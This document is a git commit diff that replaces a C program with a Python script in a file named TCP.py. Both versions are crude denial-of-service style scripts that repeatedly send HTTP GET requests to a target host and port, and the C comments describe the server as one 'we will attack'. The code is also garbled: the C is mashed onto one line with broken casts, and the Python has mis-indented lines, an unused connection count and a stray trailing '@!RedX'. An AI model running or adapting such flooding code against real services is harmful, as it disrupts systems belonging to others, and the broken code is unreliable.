2154413a911c8f7dd10ef9b25f62813ef959a07e
Cryspot <94024627+Cryspot@users.noreply.github.com>
2023-01-08 23:31:55 +0700

    Update TCP.py

--- TCP.py
+++ TCP.py
@@ -1,40 +1,27 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
- 
-int main(int argc, char *argv[]) {
+import socket
+import time
 
-    int sockfd, portno;
-    struct sockaddr_in serv_addr;
+# IP address of the target
+target_ip = "127.0.0.1"
+# Port number of the target
+target_port = 80 
+# Number of connections to make to the target 
+num_connections = 1000 
+# Length of time to keep the connections open (in seconds) 
+duration = 10 
 
-    if (argc != 3) {
-        fprintf(stderr,"Usage: %s hostname port\n", argv[0]);
-        exit(0);
-    }
+ # Create a socket object 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 
-    portno = atoi(argv[2]);
+ # Connect to the target IP and port 
+sock.connect((target_ip, target_port)) 
 
-    // Membuat socket TCP 
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+ # Keep the connection alive for a certain duration  
+start = time.time()  
+while (time.time() - start) < duration:  
 
-    if (sockfd < 0) { 
-        perror("ERROR opening socket"); 
-        exit(1); 
-    }
+    # Send data to the target  
+    sock.send("GET / HTTP/1.1\r\n")  
 
-    // Mengambil alamat IP dari hostname yang diberikan 
-    struct hostent *server; 
-
-    server = gethostbyname(argv[1]);
-
-    if (server == NULL) { 
-        fprintf(stderr,"ERROR, no such host\n"); 
-        exit(0); 
-    }
-
-     // Membuat struktur alamat untuk server yang akan kita serang  										   // dengan menggunakan port yang diberikan sebagai argumen  					   // ke program ini.  
-
-     bzero((char *) &serv_addr, sizeof(serv_addr));   serv_addr.sin_family = AF_INET;   bcopy((char *)server->h_addr, (char )&serv_addr.sin_addr.s_addr, server->h_length);   serv_addr.sin_port = htons(portno);   // Melakukan koneksi ke server yang telah kita tentukan sebelumnya     if (connect(sockfd, (struct sockaddr)&serv_addr, sizeof(serv_addr)) < 0)      {          perror("ERROR connecting");          exit(1);      }      else      {          printf("Connected to %s on port %d\n", argv[1], portno);      }       while (1)      {          sendto(sockfd,"GET / HTTP/1.0\r\n\r\n", strlen("GET / HTTP/1.0\r\n\r\n"), 0 , NULL , 0 );          sleep(2);      }       close(sockfd);       return 0; }
+    # Close the connection when finished  
+sock.close()@!RedX
